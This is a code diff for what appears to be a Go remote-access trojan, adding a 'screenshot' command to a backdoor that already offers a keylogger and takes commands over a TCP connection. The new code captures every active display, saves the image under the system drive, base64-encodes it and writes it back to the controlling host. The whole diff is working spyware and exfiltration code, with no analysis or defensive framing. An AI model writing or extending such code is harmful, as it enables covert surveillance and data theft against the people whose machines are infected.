@@ -10,6 +10,8 @@ import (
  "io/ioutil"
  "syscall"
  "time"
+ "image/png"
+ screenshot "github.com/kbinani/screenshot"
 )
 
 const (
@@ -42,6 +44,22 @@ func WaitTimeMenu(){
   }
 }
 
+func TakeScreenShot(){
+  n := screenshot.NumActiveDisplays()
+
+  for i := 0; i < n; i++ {
+ 	  bounds := screenshot.GetDisplayBounds(i)
+
+ 		img, err := screenshot.CaptureRect(bounds)
+ 		if err != nil {
+ 			connect()
+ 		}
+ 		file, _ := os.Create(os.Getenv("systemdrive") + folderPath + "\\screenshot.png")
+ 		defer file.Close()
+ 		png.Encode(file, img)
+ 	}
+}
+
 func connect(){
   conn, err := net.Dial("tcp", IP)
 
@@ -68,6 +86,20 @@ func connect(){
     case "exit":
       conn.Close()
       os.Exit(0)
+
+    case "screenshot":
+	    TakeScreenShot()
+ 	    file, err := ioutil.ReadFile(string(os.Getenv("systemdrive") + folderPath + "\\screenshot.png"))
+
+	    if err != nil {
+		      conn.Write([]byte("[!] File not found!" + "\n"))
+	    }
+
+	    encData := base64.URLEncoding.EncodeToString(file)
+      conn.Write([]byte(string(encData) + "\n"))
+      fmt.Println(encData)
+      command, _ := bufio.NewReader(conn).ReadString('\n')
+      fmt.Println(command)
 
     case "keylogger start":
       go Keylogger()
